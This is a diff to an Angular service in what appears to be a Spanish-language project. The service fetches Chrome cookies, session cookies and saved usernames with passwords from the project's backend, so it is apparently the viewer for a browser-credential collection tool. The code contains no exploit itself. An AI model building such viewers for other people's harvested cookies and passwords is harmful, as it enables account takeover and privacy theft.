@@ -2,10 +2,8 @@ import { Injectable } from '@angular/core';
 import {HttpClient} from "@angular/common/http";
 import {environment} from "../../environments/environment";
 import {Observable} from "rxjs";
-import {Edge} from "../modelos/edge";
-import {Firefox} from "../modelos/firefox";
-import {EdgeUser} from "../modelos/edge-user";
 import {ChromeCookies} from "../modelos/chrome-cookies";
+import {ChromeUser} from "../modelos/chrome-user";
 
 @Injectable({
   providedIn: 'root'
@@ -13,23 +11,23 @@ import {ChromeCookies} from "../modelos/chrome-cookies";
 export class ServicesService {
 
   private baseUrl = environment.baseUrl+'/cookies';
+  private baseUrlUsers = environment.baseUrl+'/usuarios';
 
   constructor(private http: HttpClient) { }
 
-  getEdge(): Observable<Edge[]> {
-    return this.http.get<Edge[]>(`${this.baseUrl}/edge`);
+  obtener_usuario_contrasenia(): Observable<ChromeUser[]> {
+    return this.http.get<ChromeUser[]>(`${this.baseUrlUsers}/chrome`);
   }
-
-  getFirefox(): Observable<Firefox[]> {
-    return this.http.get<Firefox[]>(`${this.baseUrl}/firefox`);
-  }
-
-  getEdgeUser(): Observable<EdgeUser[]> {
-    return this.http.get<EdgeUser[]>(`${this.baseUrl}/usuarios/edge`);
-  }
-
   getChromeCookies(): Observable<ChromeCookies[]> {
     return this.http.get<ChromeCookies[]>(`${this.baseUrl}/chrome`);
+  }
+
+  get_edge_session_cookies(): Observable<ChromeCookies[]> {
+    return this.http.get<ChromeCookies[]>(`${this.baseUrl}/chrome/session`);
+  }
+
+  numeros_paginas_encontradas_sin_repetir(): Observable<any> {
+    return this.http.get<any>(`${this.baseUrlUsers}/chrome/paginas`);
   }
 
   getChromeNumeroPaginas(): Observable<ChromeCookies[]> {
